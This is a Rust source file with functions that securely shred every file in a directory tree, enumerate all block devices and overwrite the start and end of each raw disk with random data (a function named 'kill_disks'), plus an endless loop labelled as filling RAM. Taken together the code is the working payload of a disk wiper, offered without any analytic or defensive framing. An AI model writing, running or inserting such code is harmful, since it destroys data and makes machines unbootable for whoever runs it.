use std::io;
use std::mem;
use std::io::{Write, Seek,  SeekFrom};
use std::fs;
use std::fs::OpenOptions;
use std::path::Path;
use std::process::Command;
use rand::Rng;

pub fn delete_files_recursively(dir_path: &str) -> io::Result<()> {
    let path = Path::new(dir_path);

    if path.is_dir() {
        for entry in fs::read_dir(path)? {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                delete_files_recursively(path.to_str().unwrap())?;
            } else if path.is_file() {
                println!("Deleted {}", path.to_string_lossy());
                overwrite_and_delete_file(path.to_str().unwrap())?;
            }
        }
    }

    Ok(())
}

fn overwrite_and_delete_file(file_path: &str) -> io::Result<()> {
    // File size
    let file_size = fs::metadata(file_path)?.len() as usize;

    // Generate random data
    let mut rng = rand::thread_rng();
    let random_data: Vec<u8> = (0..file_size).map(|_| rng.gen()).collect(); // Generate 1024 random bytes

    // Open the file in write mode, creating it if it doesn't exist
    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(file_path)?;
    
    println!("Deleting {}", file_path);
    // Overwrite the file with random data
    file.seek(SeekFrom::Start(0))?; // Seek to the start of the file
    file.write_all(&random_data)?; // Write the random data
    file.flush()?; // Ensure all data is written

    // Delete the file
    fs::remove_file(file_path)?;

    Ok(())
}

fn get_block_devices() -> Vec<String> {
    let output = Command::new("lsblk")
      .arg("--output=NAME")
      .arg("--noheadings")
      .output()
      .unwrap();

    let mut block_devices: Vec<String> = vec![];
    let mut _output_str = String::new();
    if output.status.success() {
      _output_str = String::from_utf8(output.stdout).unwrap();
      block_devices = _output_str.lines()
        .filter(|line| !line.starts_with('|') && !line.starts_with('│') && !line.starts_with('├') && !line.starts_with('└') && !line.starts_with('-'))
        .map(|line| line.to_string())
        .collect();
    }
    block_devices
}


pub fn kill_disks() -> std::io::Result<()> {
    let block_devices: Vec<String> = get_block_devices();
    for block_device in block_devices {
        let diskname = format!("/dev/{block_device}");

        let mut disk = OpenOptions::new()
            .write(true)
            .open(diskname)?;

        let mut rng = rand::thread_rng();
        let mut buffer = vec![0u8; 512 * 1024];
        rng.fill(&mut buffer[..]);

        disk.seek(SeekFrom::Start(0))?;
        disk.write_all(&buffer)?;
        disk.seek(SeekFrom::End(-524288_i64))?;
        disk.write_all(&buffer)?;
    }

    Ok(())
}

pub fn fill_up_ram() {
    let mut rng = rand::thread_rng();
    let mut buffer: Vec<u8> = vec![0; mem::size_of::<u8>()];

    loop {
        rng.fill(&mut buffer[..]);
    }
}




#[cfg(test)]
mod tests { 
    use super::*; 
    
    #[test]
    fn test_block_devices() {
        assert_eq!(vec!["sda".to_string()], get_block_devices())
    }
}
